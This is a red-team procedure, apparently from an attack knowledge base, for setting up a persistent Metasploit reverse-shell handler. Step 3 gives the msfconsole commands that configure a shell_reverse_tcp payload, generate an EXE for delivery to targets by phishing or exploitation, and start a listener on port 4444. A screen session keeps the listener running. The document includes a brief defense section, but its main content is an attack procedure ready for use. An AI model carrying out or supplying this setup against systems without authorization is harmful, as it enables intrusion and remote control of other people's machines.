---
type: procedure
description: >-
  Establishes a persistent Metasploit handler to receive reverse shell
  connections from compromised hosts, enabling command execution and control.
verified: true
submitted: false
created_at: '2023-04-06T03:56:21Z'
updated_at: '2023-05-26T00:59:28Z'
tactics:
  - '[[Command and Control]]'
  - '[[Execution]]'
techniques:
  - '[[Command-Line Interface]]'
  - '[[Remote Access Tools]]'
sub_techniques: []
tags:
  - '[[tags/Background handler]]'
  - '[[tags/Metasploit]]'
commands:
  - '[[commands/screen-detach-resume]]'
  - '[[commands/launch-msfconsole-sudo]]'
platforms:
  - Linux
tools:
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# Setup-Metasploit-Reverse-Shell-Handler

## Summary

This procedure sets up a Metasploit multi/handler to listen for incoming reverse shell connections from a compromised target, allowing remote command execution and persistent access. It uses a generic shell reverse TCP payload, generates an executable for delivery, and runs the handler in a detachable screen session to ensure persistence even if the terminal disconnects.

## Description

The Metasploit Reverse Shell Handler leverages the framework's multi/handler module to create a listener on the attacker's machine. When a target executes the generated payload (e.g., via initial access vectors like phishing or exploitation), it initiates a reverse connection back to the handler, establishing a shell for interactive control. This is particularly useful in red team engagements for maintaining command and control (C2) over compromised Windows or Linux systems. The setup binds to all interfaces (0.0.0.0) on a specified port, generates a standalone EXE payload, and configures the handler not to exit on session loss. Prerequisites include a controlled attacker environment with Metasploit installed, and the generated payload must be delivered separately to the target.

## Requirements

1. Metasploit Framework installed on a Linux-based attacker machine (e.g., Kali Linux).
2. Root or sudo privileges for launching msfconsole.
3. Network accessibility: The attacker's IP must be reachable from the target, and the listening port (default 4444) must not be blocked by firewalls.
4. Screen utility installed for session persistence.

## Defense

- Monitor for unauthorized processes like msfconsole or suspicious network listeners on non-standard ports.
- Implement application whitelisting to block unsigned executables like the generated meterpreter.exe.
- Use network segmentation and egress filtering to prevent reverse connections to external IPs.
- Enable endpoint detection and response (EDR) tools to flag Metasploit payloads and anomalous shell activity.

## Objectives

1. Establish a reliable listener for reverse shell callbacks from targets.
2. Generate a deliverable payload (EXE) for initial access exploitation.
3. Maintain session persistence through detachable terminal management.
4. Enable interactive command execution on the compromised host upon connection.

## Instructions

### Step 1: Start a Detachable Screen Session

**Context**: Initiate a new or resume an existing screen session to run the handler persistently, preventing interruption if the SSH or terminal connection drops. This ensures the listener remains active.

**Command** ([[commands/screen-detach-resume]]):
```bash
screen -dRR
```

> The screen session starts or reattaches. You should see a blank terminal prompt indicating the session is ready. If a session exists, it resumes; otherwise, a new one is created.

**Expected Output**: Screen session prompt (e.g., [detached from 12345.pts-0.hostname]).

### Step 2: Launch Metasploit Console with Elevated Privileges

**Context**: Start the Metasploit console in the screen session to access the framework's modules. Sudo is used to ensure sufficient privileges for binding to low ports if needed and running the handler securely.

**Command** ([[commands/launch-msfconsole-sudo]]):
```bash
sudo msfconsole
```

> Msfconsole loads, displaying the banner and the msf6 > prompt. This indicates the framework is ready for module selection and configuration.

**Expected Output**: Metasploit banner and "msf6 >" prompt.

### Step 3: Configure and Run the Multi/Handler

**Context**: Within msfconsole, select the handler module, configure the payload and connection details, generate the EXE payload for target delivery, and start the listener. The ExitOnSession false setting keeps the handler running even if a session terminates.

**Code** ([[codes/configure-metasploit-multi-handler]]):
```bash
use exploit/multi/handler
set PAYLOAD generic/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
generate -o /tmp/meterpreter.exe -f exe
to_handler
```

> Enter each line sequentially at the msf6 > prompt. The 'use' command loads the handler. 'set' commands configure the reverse TCP payload to connect back to any interface on port 4444 without exiting on session loss. 'generate' creates the EXE payload in /tmp. 'to_handler' starts the listener, displaying "[*] Started reverse TCP handler on 0.0.0.0:4444".

**Expected Output**: Handler startup message: "[*] Started reverse TCP handler on 0.0.0.0:4444". Payload file created at /tmp/meterpreter.exe (verify with ls -l /tmp/meterpreter.exe).

### Step 4: Detach the Screen Session

**Context**: Detach from the screen session to allow it to run in the background while freeing up the terminal. The handler continues listening independently.

**Instructions**: Press Ctrl+A followed by D.

> This detaches the session without terminating it. You return to the original terminal, and the handler persists.

**Expected Output**: Message: [detached from 12345.pts-0.hostname]. The session ID is shown for later reattachment (e.g., screen -r 12345).

**Success Indicators**:
- Handler listening confirmed in msfconsole output.
- Payload EXE generated and accessible.
- Screen session detached and reattachable.
